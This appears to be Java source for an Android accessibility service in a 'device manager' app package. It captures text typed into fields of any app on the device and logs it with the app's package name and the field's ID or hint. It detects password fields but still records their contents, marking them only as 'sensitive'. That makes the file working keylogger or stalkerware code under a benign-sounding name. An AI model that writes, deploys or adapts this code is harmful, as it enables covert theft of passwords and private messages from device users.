package com.company.devicemgr.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.company.devicemgr.utils.InAppTextCaptureManager;

import java.util.List;
import java.util.Locale;

public class KeyboardAccessibilityService extends AccessibilityService {
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 50;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        }
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || !InAppTextCaptureManager.isCaptureEnabled(this)) {
            return;
        }

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        AccessibilityNodeInfo source = event.getSource();
        String textValue = resolveTextValue(event, source);
        if (TextUtils.isEmpty(textValue)) {
            return;
        }

        CharSequence packageName = event.getPackageName();
        CharSequence className = event.getClassName();
        String screenName = !TextUtils.isEmpty(packageName) ? packageName.toString() : getPackageName();
        String fieldName = resolveFieldName(event, source, className);
        boolean sensitive = isSensitiveField(source);

        InAppTextCaptureManager.recordTextChange(
                getApplicationContext(),
                screenName,
                fieldName,
                textValue,
                sensitive
        );
    }

    @Override
    public void onInterrupt() {
        // Nada a fazer.
    }

    private String resolveFieldName(AccessibilityEvent event, AccessibilityNodeInfo source, CharSequence fallbackClassName) {
        if (source != null) {
            CharSequence viewId = source.getViewIdResourceName();
            if (!TextUtils.isEmpty(viewId)) {
                return viewId.toString();
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                CharSequence hint = source.getHintText();
                if (!TextUtils.isEmpty(hint)) {
                    return hint.toString();
                }
                CharSequence pane = source.getPaneTitle();
                if (!TextUtils.isEmpty(pane)) {
                    return pane.toString();
                }
            }
        }

        if (event != null) {
            CharSequence description = event.getContentDescription();
            if (!TextUtils.isEmpty(description)) {
                return description.toString();
            }
        }

        if (!TextUtils.isEmpty(fallbackClassName)) {
            return fallbackClassName.toString();
        }
        return "keyboard_field";
    }

    private String resolveTextValue(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (event != null) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence item : texts) {
                    if (!TextUtils.isEmpty(item)) {
                        if (sb.length() > 0) sb.append(' ');
                        sb.append(item);
                    }
                }
                if (sb.length() > 0) {
                    return sb.toString();
                }
            }
        }

        if (source != null) {
            CharSequence text = source.getText();
            if (!TextUtils.isEmpty(text)) {
                return text.toString();
            }
        }
        return null;
    }

    private boolean isSensitiveField(AccessibilityNodeInfo source) {
        if (source == null) return false;
        if (source.isPassword()) return true;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence hint = source.getHintText();
            if (hint != null && hint.toString().toLowerCase(Locale.US).contains("password")) {
                return true;
            }
        }

        CharSequence viewId = source.getViewIdResourceName();
        return viewId != null && viewId.toString().toLowerCase(Locale.US).contains("password");
    }
}
